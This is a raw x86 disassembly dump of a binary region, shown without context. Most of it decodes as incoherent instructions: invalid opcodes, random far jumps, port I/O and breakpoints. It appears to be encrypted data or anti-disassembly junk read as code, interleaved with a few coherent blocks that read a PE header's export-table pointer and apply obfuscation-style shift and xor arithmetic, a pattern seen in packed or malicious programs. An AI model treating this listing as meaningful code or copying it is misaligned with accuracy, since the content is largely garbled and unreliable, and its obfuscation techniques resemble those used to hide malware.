  406634:	mov    al,0x7a
  406636:	mov    dh,0x6
  406638:	repnz push esi
  40663a:	xchg   ebp,eax
  40663b:	push   0x6316fda
  406640:	mov    bl,0x7f
  406642:	pop    eax
  406643:	lods   eax,DWORD PTR ds:[esi]
  406644:	arpl   WORD PTR [ebx],ax
  406646:	jo     0x4065f9
  406648:	int3   
  406649:	stc    
  40664a:	mov    cl,0xd1
  40664c:	push   ebx
  40664d:	sub    BYTE PTR [edi-0xb],dl
  406650:	push   cs
  406651:	and    ebp,DWORD PTR [edx-0x28591ea7]
  406657:	in     al,0xfe
  406659:	dec    esp
  40665a:	sub    BYTE PTR [edx+0x57],al
  40665d:	test   eax,0x529f0844
  406662:	in     al,0x79
  406664:	jmp    0x2e68:0xae179d0e
  40666b:	bound  eax,QWORD PTR [esi]
  40666d:	xor    eax,DWORD PTR [ebx+0x3024fd82]
  406673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406674:	and    al,BYTE PTR [edi]
  406676:	ss nop
  406678:	mov    edx,DWORD PTR [ebx+0x4]
  40667b:	xor    eax,0xcb79b577
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0xd825920c
  4066b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b3:	jecxz  0x406673
  4066b5:	cmp    edi,DWORD PTR [esi-0x413b4242]
  4066bb:	mov    esi,0x926a14b5
  4066c0:	stc    
  4066c1:	and    ecx,esp
  4066c3:	push   0x2da46a9f
  4066c8:	inc    edx
  4066c9:	retf   
  4066ca:	mov    cl,0x55
  4066cc:	pusha  
  4066cd:	xchg   esp,eax
  4066ce:	dec    edi
  4066cf:	retf   0xac2d
  4066d2:	cmc    
  4066d3:	or     dl,BYTE PTR [edi-0x7e0570d2]
  4066d9:	push   0x78cd7614
  4066de:	mov    ?,WORD PTR [ebp-0xf709431]
  4066e4:	cmc    
  4066e5:	pop    edx
  4066e6:	sbb    ch,BYTE PTR [ecx+0x13]
  4066e9:	fstp   QWORD PTR [edx-0x4f]
  4066ec:	sub    ecx,DWORD PTR [eax+0x6ac10c12]
  4066f2:	clc    
  4066f3:	push   eax
  4066f4:	test   edx,ecx
  4066f6:	arpl   WORD PTR [ebx+eiz*2+0xfe74588],cx
  4066fd:	push   es
  4066fe:	jmp    0x406760
  406700:	aaa    
  406701:	aam    0xbc
  406703:	xchg   ebx,eax
  406704:	(bad)  [ebp+edx*2+0x34020a4d]
  40670b:	cli    
  40670c:	ins    DWORD PTR es:[edi],dx
  40670d:	adc    dl,BYTE PTR [ebx]
  40670f:	inc    esp
  406710:	and    BYTE PTR [esi-0x7a677dce],0x90
  406717:	pop    es
  406718:	lea    eax,[ebp+eax*2-0x76523d9d]
  40671f:	push   ds
  406720:	jl     0x40678a
  406722:	jbe    0x4066a6
  406724:	es push es
  406726:	mov    al,BYTE PTR [edi]
  406728:	popa   
  406729:	popa   
  40672a:	aam    0xd8
  40672c:	push   ds
  40672d:	push   edx
  40672e:	repnz sbb dh,BYTE PTR [esi]
  406731:	xor    edx,DWORD PTR [eax+0xfb522ea]
  406737:	inc    edx
  406738:	and    al,0xa6
  40673a:	mov    cs,esi
  40673c:	test   al,0xb5
  40673e:	mov    al,0x27
  406740:	repnz adc BYTE PTR cs:[esi-0x2e],ah
  406745:	clc    
  406746:	sub    BYTE PTR [edx],bl
  406748:	sub    ebp,DWORD PTR [edi]
  40674a:	in     al,0xcb
  40674c:	dec    edi
  40674d:	xor    ecx,DWORD PTR [ecx]
  40674f:	sub    esi,DWORD PTR ss:[eax+0x76]
  406753:	push   eax
  406754:	xor    al,0x85
  406756:	jae    0x40677f
  406758:	mov    ds:0x82523b1a,eax
  40675d:	push   edi
  40675e:	or     BYTE PTR [edi+0x697a9cfa],0x5d
  406765:	mov    eax,0x623f4ffb
  40676a:	bnd jb 0x406710
  40676d:	inc    edx
  40676e:	imul   edi,esi,0xffffffb1
  406771:	or     DWORD PTR [ebp+0x484cee8f],esp
  406777:	(bad)  
  406779:	sahf   
  40677a:	int3   
  40677b:	stc    
  40677c:	leave  
  40677d:	js     0x4067a8
  40677f:	cmp    al,0xfa
  406781:	sbb    al,0x3f
  406783:	sbb    esi,DWORD PTR ds:0x43080df
  406789:	jae    0x406781
  40678b:	xor    DWORD PTR [ebp-0x61f6b304],edi
  406791:	or     DWORD PTR [ebx],esp
  406793:	lods   eax,DWORD PTR ds:[esi]
  406794:	mov    esi,0xe4b3d8ab
  406799:	pop    ebp
  40679a:	jge    0x40678f
  40679c:	inc    ebp
  40679d:	add    DWORD PTR [edx-0x5b],0x54e82a63
  4067a4:	jbe    0x4067e4
  4067a6:	outs   dx,BYTE PTR ds:[esi]
  4067a7:	repnz mov ah,0x38
  4067aa:	push   edx
  4067ab:	or     ah,cl
  4067ad:	test   BYTE PTR [eax+0x57],0xc2
  4067b1:	adc    eax,0xa9281de7
  4067b6:	cli    
  4067b7:	xchg   BYTE PTR ds:0x427f9825,al
  4067bd:	clc    
  4067be:	sub    al,0xf9
  4067c0:	dec    eax
  4067c1:	or     ch,BYTE PTR [ecx-0x13783a7b]
  4067c7:	jno    0x4067e9
  4067c9:	aam    0xfe
  4067cb:	push   ss
  4067cc:	mov    edx,0x7ab06d1
  4067d1:	pop    ds
  4067d2:	fadd   DWORD PTR [edi]
  4067d4:	add    BYTE PTR [esi],ah
  4067d6:	dec    esi
  4067d7:	hlt    
  4067d8:	in     al,dx
  4067d9:	push   ss
  4067da:	push   esp
  4067db:	xchg   ecx,edx
  4067dd:	sub    eax,0x6efb95f
  4067e2:	in     eax,dx
  4067e3:	sahf   
  4067e4:	xchg   ebx,eax
  4067e5:	cli    
  4067e6:	retf   
  4067e7:	xor    eax,edi
  4067e9:	loope  0x406846
  4067eb:	je     0x40686b
  4067ed:	mov    DWORD PTR ds:0x70acd988,esp
  4067f3:	mov    ah,0x78
  4067f5:	popf   
  4067f6:	dec    edx
  4067f7:	and    DWORD PTR [esi],esp
  4067f9:	faddp  st(6),st
  4067fb:	imul   DWORD PTR ds:0x9d46918d
  406801:	push   es
  406802:	xor    al,0xa5
  406804:	and    eax,0xcb0e5a08
  406809:	sbb    eax,0xc7a0cbd0
  40680e:	into   
  40680f:	jnp    0x4067b5
  406811:	cmc    
  406812:	xor    ebx,DWORD PTR [esp+eiz*4]
  406815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406816:	mov    ch,0xfc
  406818:	sub    BYTE PTR [edx+0xc71ea57],ah
  40681e:	mov    dh,0xd
  406820:	je     0x406866
  406822:	cdq    
  406823:	adc    bl,dh
  406825:	add    al,ah
  406827:	dec    esp
  406828:	inc    esi
  406829:	push   edx
  40682a:	stos   DWORD PTR es:[edi],eax
  40682b:	mov    dl,0xc5
  40682d:	adc    ch,bl
  40682f:	jo     0x406836
  406831:	into   
  406832:	xchg   edi,eax
  406833:	jae    0x406856
  406835:	dec    edx
  406836:	fwait
  406837:	test   al,0xf2
  406839:	adc    BYTE PTR [eax+0x26],0x44
  40683d:	inc    ebx
  40683e:	rcr    DWORD PTR [edx-0xdef8fc9],1
  406844:	lods   eax,DWORD PTR ds:[esi]
  406845:	xacquire xchg DWORD PTR [edx+0x55e29bca],edx
  40684c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40684d:	test   DWORD PTR [eax-0x3],0x2bd6af5b
  406854:	xadd   BYTE PTR [ecx+0x2df16430],bl
  40685b:	cli    
  40685c:	pop    es
  40685d:	ds stos DWORD PTR es:[edi],eax
  40685f:	pop    esp
  406860:	imul   edx,esi,0xffffffe6
  406863:	add    DWORD PTR [ebx+0x44d6c652],esi
  406869:	jb     0x406805
  40686b:	mov    esp,DWORD PTR [esi+0x67]
  40686e:	ror    ecx,1
  406870:	mov    ch,BYTE PTR [edi-0x7b]
  406873:	in     al,dx
  406874:	aam    0x93
  406876:	xchg   BYTE PTR [ebx],bl
  406878:	or     ecx,DWORD PTR [edi]
  40687a:	fist   WORD PTR [edi-0x4]
  40687d:	xor    al,BYTE PTR [ecx]
  40687f:	push   ecx
  406880:	jg     0x406844
  406882:	add    eax,0x5b8547e6
  406887:	push   0x64336c80
  40688c:	add    ebx,ebp
  40688e:	add    al,0xa5
  406890:	fwait
  406891:	into   
  406892:	inc    esp
  406893:	fiadd  WORD PTR [edi+0x4e89e58b]
  406899:	pop    es
  40689a:	or     BYTE PTR [ebp+0x75],cl
  40689d:	push   es
  40689e:	jb     0x4068db
  4068a0:	sbb    eax,0x1de5a2e8
  4068a5:	mov    ds:0xeb916392,eax
  4068aa:	ret    0x3289
  4068ad:	add    eax,0x334f13e
  4068b2:	jo     0x40689b
  4068b4:	mov    dh,0xaf
  4068b6:	(bad)  
  4068b7:	mov    ebx,0x4c671ea7
  4068bc:	fisubr DWORD PTR [eax+0x689b0778]
  4068c2:	dec    esp
  4068c3:	dec    ebx
  4068c4:	or     BYTE PTR [ebp+0x64],dh
  4068c7:	dec    esi
  4068c8:	out    dx,eax
  4068c9:	mov    dh,BYTE PTR [ecx]
  4068cb:	cmp    bl,al
  4068cd:	fidivr WORD PTR [eax-0x41]
  4068d0:	xor    bh,0xa8
  4068d3:	mov    ebp,0xbc3cc3e7
  4068d8:	add    eax,DWORD PTR [edx+eax*8-0x33aab351]
  4068df:	and    al,0x10
  4068e1:	jno    0x406877
  4068e3:	data16 je 0x4068b4
  4068e6:	xor    eax,0x63ada89d
  4068eb:	mov    cl,0x9
  4068ed:	mov    ebp,0x1e9473c3
  4068f2:	sbb    DWORD PTR [ebp-0x499445b],edi
  4068f8:	add    al,BYTE PTR [ecx+esi*1-0x746216f]
  4068ff:	inc    esp
  406900:	daa    
  406901:	xchg   esi,eax
  406902:	push   0x74e9b984
  406907:	lock aas 
  406909:	push   0xe90debab
  40690e:	xor    eax,0x71d7540e
  406913:	push   0x70e71720
  406918:	test   BYTE PTR [edx+0x1a],al
  40691b:	pushf  
  40691c:	and    bl,BYTE PTR [ebx-0x2a7f9146]
  406922:	mov    ch,0x9
  406924:	and    eax,0xc2587646
  406929:	cdq    
  40692a:	pushf  
  40692b:	shl    al,cl
  40692d:	pop    ds
  40692e:	or     DWORD PTR [eax+0x77],esp
  406931:	or     eax,0xe2aa702e
  406936:	ins    BYTE PTR es:[edi],dx
  406937:	sbb    edi,esp
  406939:	cli    
  40693a:	mov    al,0x41
  40693c:	adc    dl,dl
  40693e:	inc    edx
  40693f:	stc    
  406940:	pop    esi
  406941:	fisub  DWORD PTR [edi+0x7ed70380]
  406947:	jnp    0x40691f
  406949:	mov    al,ds:0xb2842f28
  40694e:	inc    eax
  40694f:	popw   es
  406951:	dec    edi
  406952:	mov    ebx,0xb0954135
  406958:	cmc    
  406959:	sub    cl,bh
  40695b:	cmp    dh,bl
  40695d:	pop    esp
  40695e:	push   ecx
  40695f:	test   BYTE PTR [edi-0x1a],dh
  406962:	(bad)  
  406963:	fcmovb st,st(0)
  406965:	lahf   
  406966:	mov    cl,0x5c
  406968:	ror    al,0x84
  40696b:	mov    eax,ds:0x372ac392
  406970:	pop    esi
  406971:	xchg   edi,eax
  406972:	icebp  
  406973:	xor    al,0xb1
  406975:	xchg   ebp,eax
  406976:	dec    esp
  406977:	imul   eax,DWORD PTR [ebx-0x9c6e6ff],0xbf0be2c8
  406981:	(bad)  
  406982:	mov    al,0xb3
  406984:	xchg   edx,eax
  406985:	ins    DWORD PTR es:[edi],dx
  406986:	push   esp
  406987:	jmp    0xc2ac:0xc6085074
  40698e:	pop    ecx
  40698f:	outs   dx,DWORD PTR ds:[esi]
  406990:	lock mov ecx,0x59f39e1
  406996:	jmp    0x41d7:0xc4ec3e3c
  40699d:	xchg   esp,eax
  40699e:	and    dh,BYTE PTR [esi-0x2b]
  4069a1:	lock int3 
  4069a3:	mov    BYTE PTR [edi+0x28],0x79
  4069a7:	sub    BYTE PTR [edx],bl
  4069a9:	ret    
  4069aa:	add    ah,BYTE PTR [esi]
  4069ac:	repz inc esi
  4069ae:	push   ecx
  4069af:	jge    0x4069ce
  4069b1:	lock and ecx,eax
  4069b4:	pop    es
  4069b5:	mov    cl,0x56
  4069b7:	sub    al,0xe9
  4069b9:	jne    0x4069e2
  4069bb:	mov    dl,0x6c
  4069bd:	fld    QWORD PTR [esi-0x3e6bfd31]
  4069c3:	std    
  4069c4:	push   esp
  4069c5:	add    al,0x51
  4069c7:	ret    0x65cc
  4069ca:	and    al,0x20
  4069cc:	enter  0xd586,0xfd
  4069d0:	mov    al,ds:0xc56ed77b
  4069d5:	out    dx,eax
  4069d6:	sbb    eax,0xcf156ed2
  4069db:	xchg   ebp,eax
  4069dc:	lock fcomp DWORD PTR [ebx]
  4069df:	jae    0x4069c5
  4069e1:	rol    BYTE PTR [edx],cl
  4069e3:	dec    eax
  4069e4:	fsubrp st(2),st
  4069e6:	inc    edi
  4069e7:	add    dl,BYTE PTR [ecx]
  4069e9:	fiadd  DWORD PTR [ebx-0x64196ca3]
  4069ef:	shr    DWORD PTR [ecx-0x75a33a6a],1
  4069f5:	scas   al,BYTE PTR es:[edi]
  4069f6:	inc    esp
  4069f7:	xor    eax,DWORD PTR [ebp-0x10b30c5]
  4069fd:	jno    0x406a48
  4069ff:	push   ss
  406a00:	or     esi,DWORD PTR [ebx]
  406a02:	fsubp  st(1),st
  406a04:	pop    edi
  406a05:	sub    ecx,DWORD PTR [edi-0x1f]
  406a08:	inc    ebp
  406a09:	push   esp
  406a0a:	in     al,dx
  406a0b:	cmp    eax,0x47935021
  406a10:	push   ebp
  406a11:	sub    al,0x4d
  406a13:	cs in  al,dx
  406a15:	xchg   ebx,eax
  406a16:	push   ebx
  406a17:	out    0xe1,eax
  406a19:	(bad)  [esi-0x7b]
  406a1c:	int    0x17
  406a1e:	loop   0x406a65
  406a20:	clc    
  406a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a22:	fild   WORD PTR [edi]
  406a24:	xor    bl,al
  406a26:	stos   DWORD PTR es:[edi],eax
  406a27:	inc    edi
  406a28:	dec    ecx
  406a29:	ret    0x56c2
  406a2c:	ror    BYTE PTR [ebx],cl
  406a2e:	enter  0xd872,0x3d
  406a32:	adc    ecx,DWORD PTR [esi+edi*2-0x670636f7]
  406a39:	jecxz  0x406a97
  406a3b:	xchg   BYTE PTR [esi],bh
  406a3d:	aam    0x74
  406a3f:	ret    
  406a40:	mov    DWORD PTR [ebp-0x6c],eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	sahf   
  406abe:	imul   edx,DWORD PTR [esi-0x2f],0xbebe41bd
  406ac5:	mov    ebp,0x95bebec4
  406aca:	inc    esi
  406acb:	sub    ebx,ecx
  406acd:	mov    eax,0x770bbae7
  406ad2:	fsubr  QWORD PTR [ecx]
  406ad4:	adc    DWORD PTR [eax],ecx
  406ad6:	aad    0x23
  406ad8:	push   cs
  406ad9:	aad    0xb8
  406adb:	add    al,0x4f
  406add:	cld    
  406ade:	or     BYTE PTR [ebp-0x2ec274db],bl
  406ae4:	pop    esp
  406ae5:	lods   al,BYTE PTR ds:[esi]
  406ae6:	(bad)  
  406ae7:	jbe    0x406b68
  406ae9:	sbb    bl,BYTE PTR [ebx-0x67]
  406aec:	rcl    DWORD PTR [ebx],1
  406aee:	repz loopne 0x406b2e
  406af1:	in     eax,0xa4
  406af3:	mov    bl,0x7c
  406af5:	inc    esp
  406af6:	pop    ds
  406af7:	or     eax,0x5e2bd6c
  406afc:	dec    esp
  406afd:	xchg   ebp,eax
  406afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aff:	loop   0x406b52
  406b01:	das    
  406b02:	enter  0xc1c1,0x69
  406b06:	lahf   
  406b07:	cmc    
  406b08:	add    ecx,edi
  406b0a:	xor    DWORD PTR [ebx+0xba5de9e],esp
  406b10:	lods   al,BYTE PTR ds:[esi]
  406b11:	pop    edi
  406b12:	mov    esi,DWORD PTR [ebx-0x42]
  406b15:	rcl    DWORD PTR [esi],1
  406b17:	icebp  
  406b18:	jp     0x406ac3
  406b1a:	lahf   
  406b1b:	std    
  406b1c:	(bad)  
  406b1d:	jl     0x406aa9
  406b1f:	sbb    eax,0x1887d234
  406b24:	mov    dl,0xd3
  406b26:	cld    
  406b27:	fimul  DWORD PTR ds:[ebx-0x4e]
  406b2b:	add    al,0x54
  406b2d:	push   es
  406b2e:	pop    edx
  406b2f:	sbb    esp,DWORD PTR [ebp-0x69]
  406b32:	mov    eax,0x56489818
  406b37:	xchg   esi,eax
  406b38:	push   es
  406b39:	fwait
  406b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b3b:	jl     0x406b52
  406b3d:	aam    0x67
  406b3f:	daa    
  406b40:	mov    edi,0x395bb2c2
  406b45:	jmp    0x406b7d
  406b47:	jle    0x406b60
  406b49:	aad    0x27
  406b4b:	inc    ecx
  406b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b4d:	adc    BYTE PTR [ebp+0x2f],cl
  406b50:	jmp    0x406b04
  406b52:	and    al,0xd4
  406b54:	repnz in al,0x2e
  406b57:	pop    ebp
  406b58:	sahf   
  406b59:	xor    dl,BYTE PTR [esi+0x780866d1]
  406b5f:	mov    edx,0x4f4717eb
  406b64:	shr    BYTE PTR fs:[ecx+0x35edc7df],cl
  406b6b:	fisubr WORD PTR [esi+0x7c22793b]
  406b71:	pop    edi
  406b72:	xor    eax,0x13f0f510
  406b77:	dec    ebp
  406b78:	in     eax,dx
  406b79:	lea    ebp,[edi]
  406b7b:	xchg   ebp,eax
  406b7c:	clc    
  406b7d:	popf   
  406b7e:	mov    dh,0x64
  406b80:	loope  0x406b0a
  406b82:	cmp    DWORD PTR [eax],ebx
  406b84:	adc    eax,0x36aa3bdf
  406b89:	mov    esi,?
  406b8b:	mov    dl,0x40
  406b8d:	mov    ds:0xbbe50a91,al
  406b92:	pop    es
  406b93:	jp     0x406b51
  406b95:	inc    eax
  406b96:	dec    eax
  406b97:	cmc    
  406b98:	sbb    eax,0xd8a140ad
  406b9d:	cli    
  406b9e:	shr    DWORD PTR [edi+0x70],1
  406ba1:	aaa    
  406ba2:	js     0x406baa
  406ba4:	adc    DWORD PTR [ecx+edx*8-0xc],ebp
  406ba8:	popa   
  406ba9:	xchg   edx,ecx
  406bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bac:	dec    ebx
  406bad:	pushf  
  406bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406baf:	imul   DWORD PTR [ebx+0x2cd4f7e1]
  406bb5:	mov    bl,0x96
  406bb7:	dec    edi
  406bb8:	push   ss
  406bb9:	jmp    0x406bce
  406bbb:	test   WORD PTR [edx-0x46],bp
  406bbf:	call   0x96014af7
  406bc4:	inc    ebp
  406bc5:	xor    DWORD PTR ss:[edx-0x4b092923],esp
  406bcc:	jmp    0x406b83
  406bce:	pop    esp
  406bcf:	cmc    
  406bd0:	pinsrw mm4,WORD PTR [edx-0x15],0xef
  406bd5:	div    bl
  406bd7:	push   edx
  406bd8:	or     BYTE PTR [ebp-0x40],bl
  406bdb:	in     eax,dx
  406bdc:	mov    cl,0x87
  406bde:	push   ecx
  406bdf:	add    eax,0xe14aabd7
  406be4:	ds retf 0x6098
  406be8:	or     BYTE PTR [esi],cl
  406bea:	lods   eax,DWORD PTR ds:[esi]
  406beb:	stos   DWORD PTR es:[edi],eax
  406bec:	xlat   BYTE PTR ds:[ebx]
  406bed:	mov    edx,0xe06bf586
  406bf2:	sbb    dh,bl
  406bf4:	or     ah,BYTE PTR [eax]
  406bf6:	loopne 0x406b80
  406bf8:	pop    es
  406bf9:	mov    ecx,0x1dbc3ad6
  406bfe:	push   edi
  406bff:	sub    al,0x71
  406c01:	loop   0x406bd3
  406c03:	adc    eax,0x1a9a5589
  406c08:	jmp    0x1286:0x872e61d5
  406c0f:	mov    cl,0x9e
  406c11:	add    edx,ebp
  406c13:	add    eax,0x7dc81a09
  406c18:	add    DWORD PTR [ecx+0x3c],esp
  406c1b:	outs   dx,BYTE PTR ds:[esi]
  406c1c:	adc    eax,0x27f55c2
  406c21:	pop    esp
  406c22:	inc    edx
  406c23:	clc    
  406c24:	and    al,0x22
  406c26:	loope  0x406bfc
  406c28:	mov    edi,0x51ee8b96
  406c2d:	xor    eax,0xfcb0a2a7
  406c32:	arpl   WORD PTR [eax],cx
  406c34:	fadd   QWORD PTR [edi+0x1b]
  406c37:	bound  ebx,QWORD PTR [edx-0x1e50978d]
  406c3d:	fcom   QWORD PTR [ebx]
  406c3f:	(bad)  [ecx]
  406c41:	(bad)  
  406c42:	push   0xffffffdf
  406c44:	out    0x34,eax
  406c46:	mov    ch,0xdc
  406c48:	jl     0x406c0a
  406c4a:	int    0x1f
  406c4c:	test   edx,esi
  406c4e:	or     al,0x18
  406c50:	rcr    BYTE PTR [ecx-0x44],0xb1
  406c54:	lock mov cl,0x97
  406c57:	out    0x77,eax
  406c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c5a:	popf   
  406c5b:	and    al,0xc7
  406c5d:	int    0x83
  406c5f:	mov    edx,0xd08803c8
  406c64:	outs   dx,BYTE PTR ds:[esi]
  406c65:	sub    al,0x44
  406c67:	or     eax,0x58711eb6
  406c6c:	mov    es,esi
  406c6e:	jmp    0xe4c5:0x2d721c11
  406c75:	sbb    al,0x6e
  406c78:	aam    0x7f
  406c7a:	sbb    eax,DWORD PTR [ecx+0x43ae4124]
  406c80:	push   0xffffffca
  406c82:	loope  0x406c85
  406c84:	pop    edx
  406c85:	add    eax,ebx
  406c87:	jl     0x406cbe
  406c89:	icebp  
  406c8a:	adc    dl,cl
  406c8c:	xor    al,0x7a
  406c8e:	test   DWORD PTR [esp+eax*4+0x51],0x5b690c6
  406c96:	hlt    
  406c97:	ret    
  406c98:	fs dec edx
  406c9a:	pop    edi
  406c9b:	aas    
  406c9c:	dec    eax
  406c9d:	mov    cl,0xd9
  406c9f:	loope  0x406ce7
  406ca1:	fs das 
  406ca3:	sbb    ah,cl
  406ca5:	xor    DWORD PTR [ebx],0x51
  406ca8:	pop    ss
  406ca9:	test   DWORD PTR [ebp-0x5852d0a8],ebx
  406caf:	pop    edx
  406cb0:	into   
  406cb1:	call   0x27ad456c
  406cb6:	mov    dl,BYTE PTR [eax+0x70]
  406cb9:	outs   dx,DWORD PTR ds:[esi]
  406cba:	xchg   ebp,eax
  406cbb:	dec    edi
  406cbc:	pop    es
  406cbd:	or     eax,0x18148106
  406cc2:	(bad)  
  406cc3:	mov    cl,0x75
  406cc5:	jmp    0x3959f43e
  406cca:	xchg   BYTE PTR [edx+0x4],ch
  406ccd:	mov    ebx,0x3a174953
  406cd2:	xchg   BYTE PTR [ebp+0x38f2a31a],ch
  406cd8:	xchg   ebp,eax
  406cd9:	cs aam 0x98
  406cdc:	jo     0x406d54
  406cde:	fstp   TBYTE PTR [ebx-0x12b91623]
  406ce4:	int    0x79
  406ce6:	popa   
  406ce7:	xchg   ebp,eax
  406ce8:	jg     0x406d4e
  406cea:	push   ds
  406ceb:	call   0x16bcb6b0
  406cf0:	jnp    0x406d40
  406cf2:	imul   edx,DWORD PTR [esi],0x98f300af
  406cf8:	or     eax,0xe7ae1974
  406cfd:	imul   edx,DWORD PTR [ebx-0x37],0x9a68f131
  406d04:	mov    eax,ds:0x40f36b1b
  406d09:	pop    ecx
  406d0a:	jnp    0x406d69
  406d0c:	hlt    
  406d0d:	jae    0x406d8a
  406d0f:	retf   0xd310
  406d12:	push   esi
  406d13:	mov    eax,ds:0x4d83f16f
  406d18:	mov    ebp,0xac13df42
  406d1d:	dec    esi
  406d1e:	xlat   BYTE PTR ds:[ebx]
  406d1f:	add    eax,0x544aae
  406d24:	adc    BYTE PTR [ebp-0x33],cl
  406d27:	jno    0x406d91
  406d29:	xor    dh,bh
  406d2b:	push   0xffffffda
  406d2d:	mov    ebx,0x65fa4bb2
  406d32:	jne    0x406cfc
  406d34:	test   al,0xd7
  406d36:	test   ebp,0x8af47af1
  406d3c:	icebp  
  406d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d3e:	lock mov ds:0x4f9ed806,eax
  406d44:	jl     0x406cd5
  406d46:	dec    dl
  406d48:	or     eax,0xf6a67a59
  406d4d:	xlat   BYTE PTR ds:[ebx]
  406d4e:	sbb    al,0xa5
  406d50:	inc    edx
  406d51:	cmp    ah,ch
  406d53:	xchg   esp,eax
  406d54:	in     al,0xee
  406d56:	jmp    0xa622:0xc02bcbb4
  406d5d:	adc    al,0x25
  406d5f:	jno    0x406d7c
  406d61:	xor    ebx,ecx
  406d63:	fidivr WORD PTR [eax+edi*1+0x75]
  406d67:	int    0xe7
  406d69:	in     eax,dx
  406d6a:	mov    eax,ds:0xfd61bb58
  406d6f:	jge    0x406d88
  406d71:	mov    bh,0x8c
  406d73:	xchg   esp,eax
  406d74:	std    
  406d75:	in     al,0x98
  406d77:	and    bl,BYTE PTR [esi-0x51]
  406d7a:	pusha  
  406d7b:	mov    edi,0x7b99218
  406d80:	js     0x406d1a
  406d82:	ret    0xe839
  406d85:	call   0x812d2593
  406d8a:	push   cs
  406d8b:	ins    BYTE PTR es:[edi],dx
  406d8c:	(bad)  
  406d8d:	jns    0x406dde
  406d8f:	js     0x406d5b
  406d91:	test   BYTE PTR [ebx],dh
  406d93:	sbb    eax,0xd0baffaa
  406d98:	shl    DWORD PTR [ebx],1
  406d9a:	inc    eax
  406d9b:	out    0x44,eax
  406d9d:	and    al,cl
  406d9f:	stos   DWORD PTR es:[edi],eax
  406da0:	gs cmp eax,eax
  406da3:	lea    ebx,[ebx+esi*8+0x42]
  406da7:	inc    ebp
  406da8:	pop    ebp
  406da9:	ss or  eax,0x4cd7aabd
  406daf:	dec    ebx
  406db0:	mov    ebp,0xbce11c73
  406db5:	inc    ecx
  406db6:	xchg   ecx,eax
  406db7:	retf   0x5770
  406dba:	jmp    0x2ef01e53
  406dbf:	xchg   ebp,eax
  406dc0:	jmp    0xdf8ca4bd
  406dc5:	mov    BYTE PTR [ebp-0xc50b7d1],al
  406dcb:	das    
  406dcc:	push   ecx
  406dcd:	stos   DWORD PTR es:[edi],eax
  406dce:	push   ecx
  406dcf:	aaa    
  406dd0:	cmp    cl,BYTE PTR [edx+ecx*2-0x53]
  406dd4:	mov    esi,0x6c3d2fe1
  406dd9:	and    al,BYTE PTR [eax]
  406ddb:	out    dx,eax
  406ddc:	pop    ds
  406ddd:	mov    ch,0x49
  406ddf:	mov    cl,0xaa
  406de1:	stos   DWORD PTR es:[edi],eax
  406de2:	dec    eax
  406de3:	mov    cs,ebp
  406de5:	add    esi,DWORD PTR [edx-0x3aafc636]
  406deb:	lock inc ecx
  406ded:	es mov ebp,0xd14d71a8
  406df3:	sbb    eax,0x48aa467c
  406df8:	inc    esp
  406df9:	mov    edx,0x17d36637
  406dfe:	jmp    0x30ed:0xfbbf28fa
  406e05:	push   0x29
  406e07:	ficomp WORD PTR [eax]
  406e09:	arpl   WORD PTR [ecx+eiz*2-0xc],sp
  406e0d:	inc    ecx
  406e0e:	data16 mov cl,0xc0
  406e11:	and    ah,BYTE PTR [eax+0x710764a1]
  406e17:	fsubr  QWORD PTR [ecx-0xa]
  406e1a:	sahf   
  406e1b:	int    0x9a
